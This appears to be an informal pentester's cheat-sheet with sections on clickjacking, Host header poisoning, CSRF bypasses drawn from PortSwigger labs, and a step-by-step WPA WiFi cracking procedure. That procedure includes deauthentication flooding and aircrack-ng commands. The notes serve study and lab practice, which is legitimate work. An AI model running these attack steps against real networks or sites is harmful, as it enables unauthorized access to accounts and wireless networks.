# CIA
	Integrity : data only change by auth.
	Avalability : Avalable data when user need.
	Confidentility : Data access by auth.
  
# Containt Discover
	gobuster -u http://fakebank.com -w wordlist.txt dir 
	
# ClickJacking
https://numberless-holddown.000webhostapp.com/clickjacking.php?url={url}
or
		
		<!DOCTYPE html>
		<html lang="en">
		<head>
		  <meta charset="UTF-8">
		</head>
		<body>
		  <iframe src="{url}" frameborder="0"></iframe>
		</body>
		</html>

# Host Header Poisoning
## Basic
	Change "Host" header 

## via middleware
	Add X-Forwarded-Host: <domain.com>
	https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
	
## via dangling markup
	Try "Host: domain.com" to "Host: domain.com:attacker.com"
	https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup
# CSRF
## CSRF parameter is not available
	---> generate CSRF POC and try

## CSRF parameter available 

	-> Change action METHOD (GET OR POST)

	-> Remove CSRF parameter
	eg. email and CSRF
	remove CSRF
	now> email

	-> enter own CSRF taken and send to victim (CSRF token one time use so, create fresh token everytime after use. For testing use inco mode. for more read paragraph.)



	1)  Open Burp's browser and log in to your account. Submit the "Update email" form, and intercept the resulting request.
	    Make a note of the value of the CSRF token, then drop the request.
	2) Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.
	3) Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.
	4) Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Note that the CSRF tokens are single-use, so you'll need to include a fresh one.
	    Store the exploit, then click "Deliver to victim" to solve the lab.


	->if CSRF key cookies and CSRF token are available

	https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie 

	->if header error occure
	1) so try remove header
	https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present

	2) if header remove not work try changing domain like
	refrer: http://google.com
	to
	http://burpsuit/?google.com
	https://portswigger.net/web-security/csrf/lab-referer-validation-broken



# Wifi Password Hacking
	

	Step 1:

	Put your wireles lan card on monitor mode

	 airmon-ng start "wireless lan card name"
	=> airmon-ng start wlan0

	Step 2:

	Capture Traffic with Airodump-ng

	airodump-ng "wireless lan card monitor mode"

	=> airodump-ng wlan0mon


	Step 3:

	Focus airodump-ng on one AP on One Channel

	 airodump-ng --bssid dummy -c dummy --write WPAcrack wlan0mon

	=> airodump-ng --bssid 8C:FD:18:88:79:68 -c 9 --write WPAcrack wlan0mon


	Step 4:

	in order to capture the encrypted password we need to have the client authenticate against AP.
	we do deauth signal to client

	 aireplay-ng --deauth 1000 -a bssid wlan0mon

	=> aireplay-ng --deauth 1000 -a 8C:FD:18:88:79:68 wlan0mon


	Step 5:

	Now we have to crack the dump file with aircrack-ng

	 aircrack-ng WPAcrack-01.cap -w (localtion of wordlist)
